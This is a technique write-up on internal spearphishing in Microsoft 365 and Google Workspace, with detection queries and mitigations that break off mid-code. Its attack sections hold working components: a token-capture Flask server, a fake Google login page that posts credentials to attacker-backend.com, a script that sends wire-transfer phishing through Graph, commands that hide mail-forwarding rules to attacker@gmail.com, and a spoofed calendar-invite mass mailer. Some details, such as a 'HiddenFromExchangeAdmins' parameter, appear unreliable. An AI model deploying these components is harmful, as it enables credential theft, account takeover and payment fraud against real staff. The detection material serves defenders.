# [IA-PHISH-005]: Internal Spearphishing Campaigns

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-005 |
| **MITRE ATT&CK v18.1** | [T1534 - Internal Spearphishing](https://attack.mitre.org/techniques/T1534/) |
| **Tactic** | Lateral Movement |
| **Platforms** | M365 (Outlook, Teams), Google Workspace |
| **Severity** | Critical |
| **CVE** | N/A (behavioral attack; no vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-12-15 |
| **Affected Versions** | All M365 environments; particularly those without MFA or inbox rule monitoring |
| **Patched In** | N/A (design limitation; mitigations via conditional access, audit logging, user training) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Internal spearphishing occurs when attackers use a **compromised internal mailbox to send phishing emails to other employees**. Unlike external phishing, internal attacks bypass email authentication checks (SPF, DKIM, DMARC pass because emails originate from legitimate internal mail servers) and leverage implicit trust—employees assume emails from colleagues are safe. Attackers send convincing, socially-engineered phishing messages to colleagues, then pivot to compromise additional accounts. The compromise can occur through multiple vectors: (1) Email with embedded device code authentication traps (Storm-2372 pattern), (2) Email with malicious links to credential harvesting pages, (3) Microsoft Teams chat invitations with phishing payloads, (4) Calendar invitations with spoofed content.

**Attack Pattern:** (1) Attacker compromises initial user account (through external phishing, password spray, or credential stuffing), (2) Attacker creates hidden inbox rules to forward incoming emails to external address for persistence and intelligence gathering, (3) Attacker uses compromised account to send phishing emails to internal contacts with high credibility ("from a trusted colleague"), (4) Victims click malicious links or enter credentials, (5) Attacker pivots to compromise additional accounts, focusing on high-value targets (finance, suppliers, executives), (6) Attacker performs business email compromise (BEC) or funds theft using chain of compromised accounts.

**Business Impact:** **Rapid lateral movement and account compromise escalation.** Internal phishing has dramatically higher success rates than external phishing because email authentication passes and employees trust internal senders. Recent campaigns demonstrate this effectiveness: Storm-2372 used device code phishing with Teams meeting invitations to compromise 300+ organizations within weeks. The Synacktiv investigation documented a single BEC incident where one compromised account led to hundreds of internal phishing emails over a 48-hour period, targeting finance teams and external suppliers. The attacker remained undetected for 25+ days, during which time funds transfers were attempted. Organizations without unified audit logging, inbox rule monitoring, and conditional access are particularly vulnerable.

**Persistence Mechanism:** Attackers establish persistence through hidden inbox rules (New-InboxRule, Set-InboxRule) that forward incoming emails to attacker-controlled external addresses. These rules bypass mailbox auditing in some configurations and remain effective even if the victim's password is reset or MFA is enabled—the rule continues to forward emails from the attacker's backend. This provides attackers long-term passive access to all incoming communications for the compromised account, enabling intelligence gathering and credential harvesting for weeks without detection.

### Operational Risk

- **Execution Risk:** **Very Low** — Once account is compromised, internal phishing is trivial: send emails from legitimate account using built-in Outlook or M365 web interface.
- **Stealth:** **Extremely High** — Emails pass SPF/DKIM/DMARC. Visual appearance is legitimate. No suspicious URLs or sender headers to alert users. Employees have extreme implicit trust in internal senders.
- **Persistence:** **Very High** — Hidden inbox rules maintain access even after password reset. Attacker has passive access to all future incoming emails.
- **Reversibility:** **No** — Once internal phishing emails are sent, cannot be recalled. Compromise of secondary accounts is permanent unless discovered and credential reset performed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 3.1, 3.2, 5.1, 5.2 | Lack of inbox rule monitoring; inadequate user awareness; failed detection of suspicious forwarding rules. |
| **DISA STIG** | AC-2, AC-3, AU-12 | Inadequate access control, audit logging of mailbox activities. |
| **CISA SCuBA** | IdM-1, IdM-2 | Weak identity governance; inadequate anomalous sign-in detection. |
| **NIST 800-53** | AC-2, AC-3, AU-12, SI-4 | Access control, audit logging, system monitoring. |
| **GDPR** | Art. 32, 33 | Insufficient security measures; breach notification. |
| **DORA** | Art. 9, 18 | ICT risk management; incident reporting. |
| **NIS2** | Art. 21, 23 | Cyber security measures; incident reporting. |
| **ISO 27001** | A.8.2.3, A.9.2.1, A.12.4.1 | User access management; audit logging. |
| **ISO 27005** | Risk Scenario: "Lateral Movement via Internal Phishing" | Compromised internal account used for phishing and credential harvesting. |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**

- **Attacker Side:** Compromised user account (any non-administrative account is sufficient). No special permissions needed to create inbox rules or send emails.
- **Victim Side:** Valid M365 user with mailbox access.

**Required Access:**

- Attacker must have valid credentials to compromised internal account.
- Attacker must be able to authenticate to Outlook Web Access (OWA), Outlook desktop, or M365 web portal.
- Attacker must be able to access internal GAL (Global Address List) to identify targets and gather organization intelligence.

**Supported Versions:**

- **M365:** All versions with Exchange Online
- **Google Workspace:** All versions with Gmail
- **Browsers:** All browsers (attack is agnostic to browser)

**Tools & Environment:**

- **Email Client:** Outlook (desktop or web), Gmail, M365 web portal
- **Phishing Infrastructure:** Attacker-controlled backend server or cloud hosting (Firebase, Azure Blob Storage, AWS S3) for credential harvesting
- **Device Code Authentication (Storm-2372 pattern):** Compromised M365 account with ability to initiate Teams meeting invitations
- **Graph API (optional):** For automating email exfiltration and forwarding rule creation

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Identifying Targets Within Organization

**Objective:** Attacker performs reconnaissance within compromised account to identify high-value targets for internal phishing.

**Global Address List (GAL) Enumeration:**

Attackers use the GAL to identify organizational structure and prioritize targets. High-value targets include:

- **Finance/Accounting:** Email addresses containing "finance", "accounting", "payment", "accounting@"
- **Executive/Leadership:** CEO, CFO, VP titles
- **External Contacts:** Customer/supplier email addresses in Global Contacts
- **IT/Security:** IT admin accounts (paradoxically, these are often phished to gain administrative access)
- **Senior Staff:** Long-tenure employees (less likely to change passwords, more likely to have sensitive data)

**PowerShell to Enumerate Organization Structure:**

```powershell
# Using compromised account, attacker can enumerate organization structure
# This can be done via M365 web portal GUI or programmatically via Graph API

$users = Get-MgUser -All | Select-Object UserPrincipalName, JobTitle, Department

# Filter for high-value targets
$finance = $users | Where-Object { $_.Department -match "Finance|Accounting|Payment" }
$executives = $users | Where-Object { $_.JobTitle -match "CFO|CEO|VP|Director" }
$suppliers = $users | Where-Object { $_.UserPrincipalName -notmatch "@company.com" }

Write-Host "[+] Finance targets: $($finance.Count)"
Write-Host "[+] Executive targets: $($executives.Count)"
Write-Host "[+] Supplier/external targets: $($suppliers.Count)"
```

**Human Intelligence (OSINT):**

Attacker can also use the compromised account to:

- Review calendar invitations to identify business partners and decision-makers
- Read recent emails to understand business context and communication style
- Check shared drives and Teams channels for organizational intelligence
- Identify recent announcements or business deals that can be leveraged in social engineering

### Detecting Suspicious Inbox Rules on User Accounts

**Objective:** Determine if existing inbox rules exist that might indicate prior compromise.

**PowerShell to Check Existing Rules:**

```powershell
# Check inbox rules on compromised account
Get-InboxRule -Mailbox "alice@company.com" | Select-Object Name, Enabled, ForwardTo

# Sample output might show:
# Name: "Archive old emails"
# Enabled: True
# ForwardTo: archive-folder

# If attacker-created rule exists:
# Name: "Monitor external emails"
# Enabled: True
# ForwardTo: attacker@gmail.com
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Code Authentication Phishing (Storm-2372 Pattern)

**Supported Versions:** All M365 versions

**Scenario:** Attacker uses compromised M365 account to send Teams meeting invitations with device code authentication phishing payload. When victim clicks the meeting link and authenticates, attacker captures the access token, gaining persistent access to the victim's account without stealing the password.

#### Step 1: Prepare Device Code Authentication Phishing Lure

**Objective:** Create phishing email with Teams meeting invitation that appears legitimate.

**Email Template (Sent from Compromised Account):**

```
From: alice@company.com
To: victim@company.com
Subject: Document Review - Online Meeting

Hi [Victim],

I wanted to schedule a quick meeting to review the Q4 financial forecast document. 

Meeting Link: https://teams.microsoft.com/l/meetup-join/19%3a...
Meeting Time: Today 2:00 PM UTC
Duration: 30 minutes

Please click the link above to join the Teams meeting.

Best regards,
Alice Johnson
Finance Manager
Company Inc.
```

**Why This Works:**

- Emails from internal senders pass SPF/DKIM/DMARC checks
- Teams meeting invitations appear in calendar/notifications (not email folder), so users don't scrutinize them as carefully
- Subject appears legitimate ("Document Review")
- Sender is a trusted internal colleague
- The link appears to be a real Microsoft Teams URL (though attacker may have modified it slightly)

**Actual Phishing Link:**

Attacker may use a legitimate Teams meeting URL but then intercept at authentication stage, OR use a lookalike domain (teams-meeting.com) that appears similar to real Teams.

#### Step 2: Victim Clicks Link and Authenticates via Device Code

**Objective:** Trick victim into entering device code that grants token access to attacker.

**Legitimate Microsoft Device Code Flow (Hijacked):**

When victim clicks the Teams meeting link, they may see a legitimate Microsoft login page:

```
┌─────────────────────────────────────┐
│  Sign in to your account            │
│                                     │
│  Email: victim@company.com          │
│                                     │
│  [Next button]                      │
│                                     │
│  ────────────────────────────────────│
│                                     │
│  Don't have an account? Sign up     │
│                                     │
└─────────────────────────────────────┘

[Page prompts for device verification code]

Enter code: ▢ ▢ ▢ ▢ ▢ ▢
```

**Device Code Phishing Technique:**

Attacker captures the device code (a temporary 6-digit code) during the authentication flow. The code is only valid for ~15 minutes. When the victim enters the code, they grant the attacker's malicious application authorization to access their M365 account.

**Example Device Code Flow:**

```
ATTACKER'S PERSPECTIVE:

1. Attacker generates a device code flow on their malicious application
2. Code generated: 123456 (15-minute window)
3. Attacker embeds this code in the phishing link OR displays it to victim
4. Victim clicks link, sees "Enter verification code"
5. Victim enters code 123456
6. Victim's browser redirects to legitimate Microsoft login
7. Victim authenticates with M365 credentials
8. Microsoft grants authorization token to attacker's application
9. Attacker captures token and gains persistent access to victim's mailbox, OneDrive, Teams

VICTIM'S PERSPECTIVE:

1. Receives Teams meeting invite from trusted colleague
2. Clicks link
3. "Sign in with your Microsoft account" appears
4. Enters credentials (thinks it's legitimate)
5. "Meeting is starting, please wait..."
6. Redirects to real Microsoft Teams (meeting may or may not exist)
7. Unaware that credentials were just used to grant access token to attacker
```

#### Step 3: Attacker Captures Access Token

**Objective:** Extract and store the victim's access token for persistent access.

**Backend Server (Receiving Token):**

```python
#!/usr/bin/env python3
"""
Device Code Authentication Token Capture
Purpose: Receive and store access tokens from compromised device code flow
"""

from flask import Flask, request
import requests
import json
from datetime import datetime

app = Flask(__name__)

# Store captured tokens in memory (or database)
captured_tokens = []

@app.route('/capture-token', methods=['POST'])
def capture_token():
    """
    Receives POST request with access token from Microsoft OAuth
    """
    data = request.json
    
    token = {
        "access_token": data.get("access_token"),
        "refresh_token": data.get("refresh_token"),
        "token_type": "Bearer",
        "scope": data.get("scope"),
        "expires_in": data.get("expires_in"),
        "user": data.get("upn"),  # User principal name
        "captured_at": datetime.now().isoformat(),
        "ip_address": request.remote_addr,
        "user_agent": request.headers.get("User-Agent")
    }
    
    # Store token
    captured_tokens.append(token)
    
    # Log to file for persistence
    with open("/var/log/captured_tokens.json", "a") as f:
        json.dump(token, f)
        f.write("\n")
    
    print(f"[+] Token captured for user: {token['user']}")
    print(f"    Access Token: {token['access_token'][:50]}...")
    print(f"    Expires in: {token['expires_in']} seconds")
    
    return {"status": "success"}

@app.route('/check-tokens', methods=['GET'])
def check_tokens():
    """
    Attacker queries backend to list captured tokens
    """
    return {
        "total_tokens": len(captured_tokens),
        "tokens": [
            {
                "user": t["user"],
                "captured_at": t["captured_at"],
                "expires_in": t["expires_in"]
            }
            for t in captured_tokens
        ]
    }

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

**What Attacker Can Do With Access Token:**

```python
# Using captured access token to access victim's M365 account
import requests

access_token = "eyJ0eXAiOiJKV1QiLCJhbGc..."  # Captured token

# Access victim's emails via Graph API
headers = {
    "Authorization": f"Bearer {access_token}"
}

# Retrieve victim's emails
response = requests.get(
    "https://graph.microsoft.com/v1.0/me/messages",
    headers=headers
)

emails = response.json()["value"]

for email in emails:
    print(f"Subject: {email['subject']}")
    print(f"From: {email['from']['emailAddress']['address']}")
    print(f"Body: {email['bodyPreview']}")
```

#### Step 4: Create Hidden Inbox Rule for Persistence

**Objective:** Even if victim changes password, attacker maintains access via hidden inbox rule.

**PowerShell to Create Hidden Inbox Rule:**

```powershell
# Using compromised credentials, attacker creates inbox rule

# Standard (visible) inbox rule
New-InboxRule `
  -Name "Archive old emails" `
  -Mailbox victim@company.com `
  -From "finance@external.com" `
  -ForwardTo "attacker@gmail.com" `
  -Enabled $true

# Hidden inbox rule (uses MAPI to hide from UI)
# This technique bypasses detection in Outlook, OWA, and Exchange admin tools

Set-InboxRule `
  -Identity "Archive old emails" `
  -Enabled $true `
  -HiddenFromExchangeAdmins $true  # Hidden from admins and Outlook UI

# Verify rule is hidden (won't appear in standard Get-InboxRule queries)
Get-InboxRule | Where-Object { $_.Name -eq "Archive old emails" }
# Output: (empty - rule is hidden)
```

**What Hidden Rules Do:**

- Forward all emails matching condition to attacker's external email address
- Attacker receives copy of all incoming emails to victim's mailbox
- Remains hidden from user's Outlook inbox rules UI
- Remains hidden from Exchange admin tools (requires special queries to detect)
- Persists even after password reset, MFA enablement, or account lockdown

#### Step 5: Attacker Uses Captured Token for Lateral Movement

**Objective:** Leverage captured access token to impersonate victim and send internal phishing to secondary targets.

**Using Graph API to Send Internal Phishing Email:**

```python
#!/usr/bin/env python3
"""
Using captured access token to send internal phishing emails
Purpose: Lateral movement to secondary targets
"""

import requests

access_token = "eyJ0eXAiOiJKV1QiLCJhbGc..."  # Token from Step 3

headers = {
    "Authorization": f"Bearer {access_token}",
    "Content-Type": "application/json"
}

# Attacker sends phishing email FROM victim's account TO secondary target
phishing_email = {
    "message": {
        "subject": "Urgent: Wire Transfer Authorization Needed",
        "body": {
            "contentType": "HTML",
            "content": """
            <h2>Urgent Action Required</h2>
            <p>Hi Finance Team,</p>
            <p>We need to process an urgent wire transfer to our new supplier: TechSupply Inc.</p>
            <p>Please review and approve the wire transfer request:</p>
            <p>
            <a href="https://attacker-backend.com/approve-transfer?token=xyz">
            Click here to approve wire transfer
            </a>
            </p>
            <p>This request is time-sensitive.</p>
            <p>Best regards,<br/>Finance Department</p>
            """
        },
        "toRecipients": [
            {
                "emailAddress": {
                    "address": "finance@company.com"
                }
            }
        ]
    },
    "saveToSentItems": "true"
}

# Send email from victim's account
response = requests.post(
    "https://graph.microsoft.com/v1.0/me/sendMail",
    headers=headers,
    json=phishing_email
)

if response.status_code == 202:
    print("[+] Internal phishing email sent from victim's account")
    print(f"    To: finance@company.com")
    print(f"    Subject: Urgent: Wire Transfer Authorization Needed")
else:
    print(f"[-] Error: {response.status_code}")
```

---

### METHOD 2: Calendar Invite Phishing (Check Point Campaign Pattern)

**Supported Versions:** Google Workspace, M365 with Outlook Calendar

**Scenario:** Attacker sends calendar invitations with malicious links that appear to come from legitimate calendar services. Victims click the invitation link, which bypasses email security filters, and are directed to credential harvesting pages.

#### Step 1: Create Spoofed Google Calendar Invite

**Objective:** Craft calendar invitation that appears to come from legitimate Google Calendar service.

**Attacker-Modified Calendar Invite (December 2024 Campaign):**

Attacker modifies the sender headers to make the email appear to come from Google Calendar:

```
From: "Google Calendar Notification" <calendar-notification@google.com>
To: victim@company.com
Subject: Invitation: Q4 Planning Session

Content-Type: multipart/mixed

[Calendar invite (.ics file attachment)]

VCALENDAR:
BEGIN:VEVENT
DTSTART:20250101T140000Z
DTEND:20250101T150000Z
SUMMARY:Q4 Planning Session
ORGANIZER:MAILTO:boss@company.com
DESCRIPTION:Join the Q4 planning session
URL:https://forms.google.com/phishing-page  <- MALICIOUS LINK

[End VEVENT]
```

**Why This Works:**

- Google Calendar emails pass DKIM/SPF/DMARC (originate from legitimate Google infrastructure)
- Calendar invitations are processed by separate services (Outlook Calendar, Gmail Calendar) not email security scanners
- Users assume calendar invitations are safe
- Invitations appear in calendar notifications, not email folder (lower scrutiny)
- Users don't expect phishing in calendar invitations

#### Step 2: Multi-Stage Redirect to Credential Harvesting

**Objective:** Use multiple redirects to confuse victims and bypass security analysis.

**Attack Chain:**

```
Victim clicks calendar invite link
           ↓
  https://forms.google.com/phishing
           ↓
  Victim sees: "reCAPTCHA - Click to verify"
  (Actually a phishing redirect)
           ↓
  Victim clicks "Verify"
           ↓
  https://attacker-backend.com/fake-login
           ↓
  Victim sees: "Sign in with your Google account"
  (Actual phishing page that looks identical to Google login)
           ↓
  Victim enters credentials: alice@company.com / password123
           ↓
  Attacker captures credentials
           ↓
  Victim is redirected to legitimate Google Forms (or error page)
```

**HTML for Multi-Stage Redirect:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Google Calendar</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <h2>Google Calendar</h2>
    <p>Loading event details...</p>
    <div class="loader"></div>
    
    <script>
        // Wait 3 seconds, then redirect to phishing page
        setTimeout(() => {
            window.location.href = "https://attacker-backend.com/fake-google-login";
        }, 3000);
    </script>
</body>
</html>
```

#### Step 3: Credential Harvesting Page

**Objective:** Create fake Google/Microsoft login page that captures credentials.

**Fake Google Login Page:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Sign in with your Google Account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            width: 360px;
            padding: 40px 30px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            height: 32px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #202124;
        }
        p {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border-color: #1f73db;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1f73db;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1565c0;
        }
        .links {
            text-align: center;
            margin-top: 20px;
        }
        .links a {
            color: #1f73db;
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
        }
        .error { color: #c5221f; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg height="32" viewBox="0 0 24 24" width="32"><g><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#4285f4"/></g></svg>
        </div>
        
        <h1>Sign in</h1>
        <p>Enter your email address or phone number to continue to Google Calendar</p>
        
        <form id="loginForm" onsubmit="handleLogin(event)">
            <div class="form-group">
                <label for="email">Email or phone</label>
                <input type="email" id="email" name="email" required autofocus>
            </div>
            
            <div id="passwordGroup" style="display:none;">
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password">
                </div>
            </div>
            
            <div id="error" class="error"></div>
            
            <button type="submit" id="nextBtn">Next</button>
            
            <div class="links">
                <a href="#">Create account</a>
            </div>
        </form>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            const nextBtn = document.getElementById("nextBtn");
            const errorDiv = document.getElementById("error");
            
            if (!password) {
                // First step: show password field
                document.getElementById("passwordGroup").style.display = "block";
                nextBtn.innerText = "Next";
                return;
            }
            
            // Send credentials to attacker backend
            nextBtn.disabled = true;
            nextBtn.innerText = "Signing in...";
            
            fetch("https://attacker-backend.com/capture-creds", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent
                })
            }).then(response => {
                if (response.ok) {
                    // Redirect to legitimate Google (or error message)
                    window.location.href = "https://accounts.google.com/";
                } else {
                    errorDiv.innerText = "Invalid password. Try again.";
                    nextBtn.disabled = false;
                    nextBtn.innerText = "Next";
                }
            }).catch(error => {
                errorDiv.innerText = "Connection error. Please try again.";
                nextBtn.disabled = false;
                nextBtn.innerText = "Next";
            });
        }
    </script>
</body>
</html>
```

#### Step 4: Send Calendar Invitations at Scale

**Objective:** Bulk-send calendar invitations to multiple targets.

**Python Script to Generate Calendar Invitations:**

```python
#!/usr/bin/env python3
"""
Calendar invitation phishing at scale
Purpose: Generate and distribute spoofed calendar invitations
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime, timedelta
import random

# Target list (obtained from LinkedIn, company website, employee directory)
targets = [
    "alice@company.com",
    "bob@company.com",
    "carol@company.com",
    "dave@company.com"
]

# Create calendar file (.ics)
def create_calendar_invite(victim_email):
    """
    Generate .ics calendar file with malicious link
    """
    now = datetime.now()
    event_start = (now + timedelta(days=1)).isoformat()
    event_end = (now + timedelta(days=1, hours=1)).isoformat()
    
    ics_content = f"""BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Google Inc//Google Calendar 70.9054//EN
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VEVENT
DTSTART:{event_start}Z
DTEND:{event_end}Z
DTSTAMP:{now.isoformat()}Z
UID:{random.randint(100000, 999999)}@google.com
CREATED:{now.isoformat()}Z
DESCRIPTION:You are invited to Q4 Planning Session. Click below to view:\nhttps://forms.google.com/phishing-page
LAST-MODIFIED:{now.isoformat()}Z
LOCATION:
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:Invitation: Q4 Planning Session
TRANSP:OPAQUE
ORGANIZER;CN=boss@company.com;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=TRUE;X-NUM-GUESTS=0:MAILTO:boss@company.com
ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE;X-NUM-GUESTS=0:MAILTO:{victim_email}
END:VEVENT
END:VCALENDAR"""
    
    return ics_content

# Send phishing emails
def send_calendar_phishing():
    """
    Send spoofed calendar invitation emails
    """
    from_email = "calendar-notification@google.com"  # Spoofed sender
    
    # Connect to attacker's mail server
    smtp_server = "attacker-mail.com"
    smtp_port = 587
    smtp_user = "attacker@gmail.com"
    smtp_password = "attacker_password"
    
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_user, smtp_password)
        
        for target in targets:
            # Create email
            msg = MIMEMultipart("mixed")
            msg["From"] = from_email
            msg["To"] = target
            msg["Subject"] = f"Invitation: Q4 Planning Session"
            
            # Email body
            body_text = """You are invited to Q4 Planning Session

When: Tomorrow, 2:00 PM - 3:00 PM
Where: Online
Organizer: boss@company.com

Click the link below to respond to this invitation:
https://forms.google.com/phishing-page
"""
            
            msg.attach(MIMEText(body_text, "plain"))
            
            # Attach .ics calendar file
            ics_content = create_calendar_invite(target)
            
            part = MIMEBase("application", "octet-stream")
            part.set_payload(ics_content.encode())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename= event.ics")
            msg.attach(part)
            
            # Send email
            server.send_message(msg)
            print(f"[+] Calendar phishing sent to: {target}")
        
        server.quit()
        print(f"\n[+] Successfully sent calendar phishing to {len(targets)} targets")
    
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    send_calendar_phishing()
```

---

## 5. TOOLS & COMMANDS REFERENCE

### [New-InboxRule - Microsoft PowerShell](https://learn.microsoft.com/en-us/powershell/module/exchange/new-inboxrule)

**Purpose:** Create email forwarding rules in Exchange Online

**Example:**

```powershell
New-InboxRule -Name "Archive" -Mailbox user@company.com -ForwardTo attacker@gmail.com
```

### [Set-InboxRule - Microsoft PowerShell](https://learn.microsoft.com/en-us/powershell/module/exchange/set-inboxrule)

**Purpose:** Modify existing rules to hide them from UI

**Example:**

```powershell
Set-InboxRule -Identity "Archive" -HiddenFromExchangeAdmins $true
```

### [Microsoft Graph API - Send Email](https://learn.microsoft.com/en-us/graph/api/user-sendmail)

**Purpose:** Send emails programmatically using captured access token

**Example:**

```bash
curl -X POST https://graph.microsoft.com/v1.0/me/sendMail \
  -H "Authorization: Bearer {access_token}" \
  -H "Content-Type: application/json" \
  -d '{"message": {"subject": "...", "body": {"contentType": "HTML", "content": "..."}}}'
```

### [Device Code Flow - Microsoft Authentication](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code)

**Purpose:** Authenticate applications with minimal user interaction

**Reference:** Storm-2372 exploits this flow by capturing device codes and intercepting token grants.

---

## 6. MICROSOFT SENTINEL DETECTION

### Query 1: Detection of Inbox Rule Creation (New-InboxRule, Set-InboxRule)

**KQL Query:**

```kusto
CloudAppEvents
| where Application == "Exchange Online"
| where ActionType in ("New-InboxRule", "Set-InboxRule", "Enable-InboxRule")
| where AccountObjectId !in (
    // Whitelist known admin accounts
    "admin@company.com",
    "it-helpdesk@company.com"
)
| project
    TimeGenerated,
    AccountObjectId,
    ActionType,
    Parameters = RawEventData,
    SourceIPAddress,
    UserAgent
| where tostring(Parameters) contains "ForwardTo"
    or tostring(Parameters) contains "RedirectTo"
```

**What This Detects:**

- Creation of forwarding rules by non-admin accounts
- Rules that forward to external email addresses
- Rules created from unusual IP addresses or user agents

### Query 2: Detection of Hidden Inbox Rules

**KQL Query:**

```kusto
CloudAppEvents
| where Application == "Exchange Online"
| where ActionType in ("Set-InboxRule")
| where RawEventData has "HiddenFromExchangeAdmins"
| where RawEventData has "true"
| project
    TimeGenerated,
    AccountObjectId,
    RuleName = tostring(parse_json(RawEventData).Name),
    Hidden = tostring(parse_json(RawEventData).HiddenFromExchangeAdmins),
    SourceIPAddress
```

### Query 3: Detection of Internal Phishing Emails

**KQL Query:**

```kusto
EmailEvents
| where SenderObjectId != RecipientObjectId
| where SenderIPv4 in (
    // Internal IP ranges
    "192.168.0.0/16",
    "10.0.0.0/8"
) or SenderIPv4 has_any ("outlook.office365.com")
| where Subject has_any ("verify", "confirm", "urgent action", "click here", "reset", "update")
| where UrlCount > 0
    or AttachmentCount > 0
| where SenderMailFromDomain endswith "@company.com"
| where RecipientEmailAddress endswith "@company.com"
| project
    TimeGenerated,
    SenderAddress,
    RecipientAddress,
    Subject,
    Url,
    AttachmentCount
```

### Query 4: Detection of Mass Email Sends from Single Account

**KQL Query:**

```kusto
EmailEvents
| where SenderMailFromDomain endswith "@company.com"
| summarize
    EmailCount = count(),
    UniqueRecipients = dcount(RecipientEmailAddress),
    FirstEmailTime = min(TimeGenerated),
    LastEmailTime = max(TimeGenerated)
    by SenderAddress
| where EmailCount > 50  // High volume threshold
| project
    SenderAddress,
    EmailCount,
    UniqueRecipients,
    TimeWindow = LastEmailTime - FirstEmailTime
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID 4688 (New Process Creation)** - Limited effectiveness

- **Applies To:** Endpoint machines
- **Effectiveness:** Low (internal phishing occurs at browser/email client level, not captured in process logs)
- **Best Use:** Detecting if attacker attempts to download malware or credential dumping tools after gaining account access

**Event ID 5140 (Network Share Connected)** - Limited effectiveness

- **Applies To:** Windows SMB activity
- **Effectiveness:** Low (internal phishing doesn't typically involve file shares initially)

**Recommended:** Focus on M365 unified audit logs rather than Windows event logs for internal phishing detection.

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query 1: Detect Inbox Rule Changes

**PowerShell:**

```powershell
# Search for inbox rule creation and modification
Search-UnifiedAuditLog `
  -Operations "New-InboxRule","Set-InboxRule","Enable-InboxRule" `
  -StartDate (Get-Date).AddDays(-7) `
  -ResultSize 5000 | `
  Export-Csv -Path "C:\Audit\inbox_rules.csv"

# Parse results
$auditLogs = Import-Csv "C:\Audit\inbox_rules.csv"

foreach ($log in $auditLogs) {
    if ($log.AuditData -like "*ForwardTo*" -or $log.AuditData -like "*RedirectTo*") {
        Write-Host "[!] Suspicious rule creation detected"
        Write-Host "    User: $($log.UserIds)"
        Write-Host "    Operation: $($log.Operations)"
        Write-Host "    Time: $($log.CreatedDate)"
    }
}
```

### Query 2: Detect Mass Email Sends

**PowerShell:**

```powershell
# Detect accounts sending bulk emails (potential internal phishing)
Search-UnifiedAuditLog `
  -Operations "Send","SendAs" `
  -StartDate (Get-Date).AddHours(-24) `
  -ResultSize 5000 | `
  Group-Object UserIds | `
  Where-Object { $_.Count -gt 100 } | `
  Select-Object Name, Count
```

### Query 3: Detect Teams Meeting Invitations

**PowerShell:**

```powershell
# Detect unusual Teams meeting creation/sharing
Search-UnifiedAuditLog `
  -Operations "TeamsSessionStarted","MeetingDetail" `
  -StartDate (Get-Date).AddDays(-1) `
  -ResultSize 1000 | `
  Where-Object { $_.AuditData -like "*external*" } | `
  Export-Csv -Path "C:\Audit\teams_external_activity.csv"
```

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable and Monitor Unified Audit Logging**

Unified audit logging must be enabled to track mailbox operations, inbox rule changes, and email forwarding.

**Manual Steps (Microsoft 365):**

1. Navigate to **Microsoft 365 Compliance Center** → **Audit**
2. Click **Start recording user and admin activity**
3. Verify status shows "Enabled"

**PowerShell:**

```powershell
